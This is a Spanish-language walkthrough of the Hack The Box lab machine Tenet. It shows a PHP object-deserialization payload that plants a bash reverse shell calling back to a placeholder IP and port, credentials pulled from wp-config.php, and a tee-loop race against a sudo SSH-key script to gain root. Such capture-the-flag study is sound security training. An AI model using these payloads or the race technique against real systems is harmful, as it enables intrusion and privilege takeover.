---
description: >-
  G4l1l30 write-up on the easy-difficulty Linux machine Tenet from
  https://hackthebox.eu
title: Hack the Box - Tenet Writeup
date: 2021-06-12 10:40:00 -0600
categories: [Hack the Box, Writeup]
tags: [htb, hacking, hack the box, redteam, Linux, php backup, php deserialization, deserialization, shell scripting ]     # TAG names should always be lowercase
show_image_post: true
image: /assets/img/Linux/Tenet/InfoCard-ScriptKiddie.png
---


![](/assets/img/Linux/Tenet/InfoCard-ScriptKiddie.png)

## Info de la maquina

| VM column  | Detalles     |
| ---------- | ------------ |
| Nombre     | Tenet        |
| Dificultad | Medium       |
| Release    | 16/01/2021   |
| OS         | Linux        |
| IP         | 10.10.10.223 |

Editamos ***/etc/hosts***  y agregamos la IP **10.10.10.223** que apunte hacia **tenet.htb** 

# Escaneo de Puertos

Escaneamos los puertos con Masscan y Nmap, utilizando **Masscan_To_Nmap** , esta herramienta escanea puertos TCP y UDP, toma los abiertos y ejecuta Nmap en búsqueda de servicios y scripts por default, mas info y donde conseguir el script: 

* > [https://github.com/Purp1eW0lf/Masscan_to_Nmap](masscan_to_nmap.py)

Ejecutamos el script : ``sudo python3 masscan_to_nmap.py -i 10.10.10.223`` 

Masscan identifica dos puertos abiertos: 

![](/assets/img/Linux/Tenet/Mass_scan.png)

Y este es el resultado de nmap:

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 20:15 BST
Nmap scan report for 10.10.10.223
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

En el puerto 22 no hay mucho que hacer, así que vamos por el puerto 80, el cual es WebServer Apache

# Enum WebSite 

Enumerando la pagina web utilizaremos **gobuster** para ver que encontramos de interesante:

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://tenet.ht
```



![](/assets/img/Linux/Tenet/wordpress.png)



Es un sito WordPress sin embargo, no hay nada en este caso que podamos hacer, siguiendo enumerando, en el portal lo unico interesante es un comentario de un post llamado **Migration** :

![](/assets/img/Linux/Tenet/migration.png)



Investigando un poco : [php backup file](https://www.programmersought.com/article/29295026083/)  hay dos formas de hacer un backup a los archivos `php` : **~** y **.bak** , en este caso **http://tenet.htb/sator.php** con las extensiones **.bak y ~** no nos ayuda mucho :) sin embargo si usamos la IP de la maquina directamente ----> **http://10.10.10.223/sator.php.bk**  

![](/assets/img/Linux/Tenet/back_php.png)

Nos descargamos el archivo y procedemos a verificarlo.

![](/assets/img/Linux/Tenet/file.png)

![](/assets/img/Linux/Tenet/php_code.png)

uhmm la parte interesante esta aqui : 

![](/assets/img/Linux/Tenet/php_des.png)



Se espera un entrada GET de `arepo` luego se busca esto ---> `unserialize($input)` , so, intentaremos explotar esa parte con ``PHP Object Deserialization`` (recomiendo el video de Ippsec sobre **PHP deserialization** ), asi que basicamente es aprovecharse de la clase `DatabaseExport` , espesificar un archivo *php* (que sera nuestro reverse shell) para pasarlo via GET.

Antes de continuar, intentemos ejecutar el script:

![](/assets/img/Linux/Tenet/ejecutar_script.png)

# PHP Deserialization - Foothold

Lo siguiente puede ser modificar el script para subir el file y obtener unr response del mismo o usar directamente *php -a* 

```php
class DatabaseExport {
  public $user_file = 'archivo.php';
  public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/IP/PUERTO 0>&1\'"); ?>';
  }

print urlencode(serialize(new DatabaseExport));
```



![](/assets/img/Linux/Tenet/seria.png)

Pasamos el payload via curl o directamente en el navegador:

![](/assets/img/Linux/Tenet/web.png)

Anteriormente la Database se actualizaba una vez, ahora dos veces :D , para obtener el reverse shell, ponemos en escucha netcat y navegamos por el archivo que acabamos de subir en la ruta `http://10.10.10.223/gali.php`

![](/assets/img/Linux/Tenet/foothold.png)

Le hacemos un upgrade a la shell : `python3 -c "import pty;pty.spawn('/bin/bash')"`

Listamos el directorio:

![](/assets/img/Linux/Tenet/wordpress_01.png)

Lo tipico es chequear `wp-config.php` : 

![](/assets/img/Linux/Tenet/credenciales_wordpress.png)

Tenemos la siguientes credenciales:

```text
neil:Opera2112
```

Intentamos loguearnos y verificar las DB:

![](/assets/img/Linux/Tenet/Tenet/DB.png)

Honestamente no hay nada interesante ahi a excepcion de esto :

![](/assets/img/Linux/Tenet/rabbit_hole.png)

Pero es un rabbit hole, el user protagonist no nos interesa por distintas razones :), asi que intentamos usar las credenciales via `SSH`

![](/assets/img/Linux/Tenet/ssh.png)

Bingo :) 

# Root 

Ya tenemos nuestras credenciales ssh a nivel de user, ahora vamos a por un privesc, verifiquemos que puede hacer este usuario a nivel de **sudo** : 

```bash
sudo -l 
```

![](/assets/img/Linux/Tenet/sudo.png)

El usuario **neil** puede ejecutar el script/archivo **enableSSH.sh** , veamos que tiene:

![](/assets/img/Linux/Tenet/enableSSHpng.png)

La parte interesante es esta :



![](/assets/img/Linux/Tenet/content.png)



Este script escribe una llave publica (id_rsa.pub) en un archivo temporal(/tmp/ssh/XXXXXXX), luego hace una verificacion y escribe el contenido en **known_hosts** de `root`, luego(clasico) borra los archivos de /tmp, este ultimo paso es importante ya que es tedioso estar copiando y ejecutar el script a la misma vez.

Usaremos **ssh-keygen** para crear una key ssh:

```bash
ssh-keygen	#El contenido se guarda en .ssh del /home de nuestro usuario.
```

![](/assets/img/Linux/Tenet/sshKeygen.png)

Ahora procederemos a enviar nuestra key a /tmp, como el contenido se borra cada "x" tiempo, lo haremos con un bucle, en este caso necesitaremos 3 terminales

## Terminal #1 y #2

```bash
while true; do echo "Tu Key SSH" | tee /tmp/ssh* > /dev/null; done
```

Basicamente estamos escribiendo **indefinidamente** con el bucle  nuestra key ssh en /tmp(esto es gracia el comando **tee** que toma el resultado del comando anterior).

![](/assets/img/Linux/Tenet/exportar_llaves.png)

En este caso tuve suerte de que se exportara a la primera :D, asi que si falla 2 o 3 veces no te preocupes.

## Terminal #3

En otra terminal, vamos a darle permiso **600** a nuestro id_rsa (**600** es num, es lo equivalente a **rw-------** )

```bash
chmod 600 id_rsa
ssh -i id_rsa root@tenet.htb
```



![](/assets/img/Linux/Tenet/root_01.png)

Se puede apreciar que tuve que volver a correr el script, gracias al bucle no fue tarea dificil.

![root_02](/assets/img/Linux/Tenet/root_02.png)

Somos root :D 

☕ 、 👨🏻‍💻️、 🍕、 🎞️

# Recursos

| Contenido                                       | url                                                          |
| ----------------------------------------------- | ------------------------------------------------------------ |
| php backup file                                 | https://www.programmersought.com/article/29295026083/        |
| Intro to PHP Deserialization / Object Injection | https://www.youtube.com/watch?v=HaW15aMzBUM                  |
| Exploiting PHP deserialization                  | https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a |
| Deserialization vulnerability                   | https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf |

